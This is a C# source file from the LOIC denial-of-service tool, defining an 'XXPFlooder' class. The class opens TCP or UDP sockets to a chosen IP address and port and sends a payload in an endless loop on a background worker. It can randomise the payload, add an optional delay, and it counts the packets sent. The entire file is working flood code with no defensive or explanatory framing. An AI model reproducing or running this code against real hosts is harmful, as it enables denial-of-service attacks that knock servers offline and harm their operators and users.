using System;
using System.Net.Sockets;
using System.ComponentModel;
using System.Text;

namespace LOIC
{
	public class XXPFlooder
	{
		public bool IsFlooding { get; set; }

		public int FloodCount { get; set; }

		public string IP { get; set; }

		public int Port { get; set; }

		public int Protocol { get; set; }

		public int Delay { get; set; }

		public bool Resp { get; set; }

		public string Data { get; set; }

        	private bool random;

		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
   		        this.random = random;
		}

		public void Start()
		{
			IsFlooding = true;
			var bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}

	        private string RandomString()
	        {
	            StringBuilder builder = new StringBuilder();
	            Random random = new Random();
	            char ch;
	            int size = random.Next(5) + 5;
	            for (int i = 0; i < size; i++)
	            {
	                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
	                builder.Append(ch);
	            }
	            return builder.ToString();
	        }

		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
        	        	byte[] buf;
				if (random == true)
				{
					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, RandomString()));
				}
				else
		                {
					buf = System.Text.Encoding.ASCII.GetBytes(Data);
				}

				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					if (Protocol == 1)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Connect(RHost);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								socket.Send(buf);
								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
							}
						}
						catch { }
					}
					if (Protocol == 2)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								socket.SendTo(buf, SocketFlags.None, RHost);
								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
							}
						}
						catch { }
					}
				}
			}
			catch { }
		}
	}
}
